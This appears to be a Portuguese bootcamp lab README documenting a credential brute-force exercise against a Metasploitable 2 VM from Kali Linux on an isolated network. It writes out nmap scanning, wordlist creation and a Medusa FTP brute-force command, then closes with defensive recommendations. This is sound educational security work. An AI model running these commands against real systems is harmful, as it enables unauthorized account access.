# Projeto-DIO-SantanderCyber2025
brute-force

Ambiente do Laboratório no VM Oracle:

Atacante: Kali Linux (virtualizado)
Alvo: Metasploitable 2 (virtualizado)
Rede: LAN isolada (sem acesso externo)

1. Descoberta do Alvo e Serviços
Iniciamos pela verificação de alcance da máquina alvo:

ping -c 3 192.168.56.101

Depois, identificamos os serviços disponíveis com o Nmap:

nmap -sV -p 21,22,80,445,139 192.168.56.101

-sV: Detecta versões dos serviços.

-p: Considera apenas as portas especificadas.

Resultado: Serviço FTP ativo (por exemplo, vsftpd 2.3.4 na porta 21).

<img width="1048" height="743" alt="image" src="https://github.com/user-attachments/assets/48e1c5ce-9295-40d3-ade2-6c52d1a21f71" />

2. Preparação das Listas de Usuários e Senhas
Para automatizar o ataque, criamos pequenos dicionários:

echo -e 'user\nadmin\nroot\nmsfadmin' > users.txt
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt

3. Execução do Ataque Brute Force com Medusa
Com as listas prontas e o serviço FTP identificado, rodamos o Medusa:

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

-h: IP do alvo

-U: Lista de usuários

-P: Lista de senhas

-M ftp: módulo específico para FTP

-t 6: número de threads (tentativas simultâneas)

O ataque continua até encontrar uma combinação válida de usuário/senha ou até esgotar as listas.

4. Validação do Acesso
Quando uma credencial válida é identificada, confirmamos o acesso ao FTP:

ftp 192.168.56.101
Name: msfadmin
Password: msfadmin
<img width="1057" height="630" alt="image" src="https://github.com/user-attachments/assets/de487981-02ed-448a-b463-fddd020a3a3e" />

<img width="1059" height="291" alt="image" src="https://github.com/user-attachments/assets/a72ea5de-fc13-432d-a245-c9fc20b9cfce" />

5. Reflexão e Recomendações de Defesa
Por que simular ataques?
Compreender as táticas dos atacantes permite criar defesas mais eficientes e realistas.

Como se defender de ataques brute force?
Bloqueio de Conta: Após várias tentativas erradas, bloquear temporariamente o usuário.

Senhas Fortes: Exigir senhas complexas e longas.

CAPTCHA/MFA: Reforçar autenticação em sistemas web.

Monitoramento de Logs: Identificar padrões de ataque e responder rapidamente.

Observação Ética:

Todos os procedimentos foram realizados em ambiente restrito, sem risco para sistemas externos ou dados reais. O objetivo foi exclusivamente educativo, promovendo consciência e responsabilidade em segurança.
